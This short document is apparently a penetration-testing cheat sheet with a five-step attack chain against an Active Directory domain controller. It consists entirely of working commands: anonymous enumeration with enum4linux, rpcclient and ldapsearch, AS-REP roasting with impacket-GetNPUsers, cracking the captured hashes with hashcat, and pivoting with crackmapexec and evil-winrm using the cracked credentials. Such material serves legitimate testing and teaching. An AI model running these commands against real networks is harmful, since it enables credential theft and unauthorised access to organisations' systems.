# Step 1 - Enumerate anonymously
enum4linux -a $DC
rpcclient -U "" -N $DC -c "enumdomusers"
ldapsearch -x -H ldap://$DC -b "dc=domain,dc=local"

# Step 2 - Extract users
# Create users.txt from enumeration

# Step 3 - AS-REP Roast
impacket-GetNPUsers domain.local/ -usersfile users.txt -request

# Step 4 - Crack hashes
hashcat -m 18200 -a 0 asrep_hashes.txt rockyou.txt

# Step 5 - Use credentials to pivot
crackmapexec smb $DC -u cracked_user -p cracked_pass --shares
evil-winrm -i $DC -u cracked_user -p cracked_pass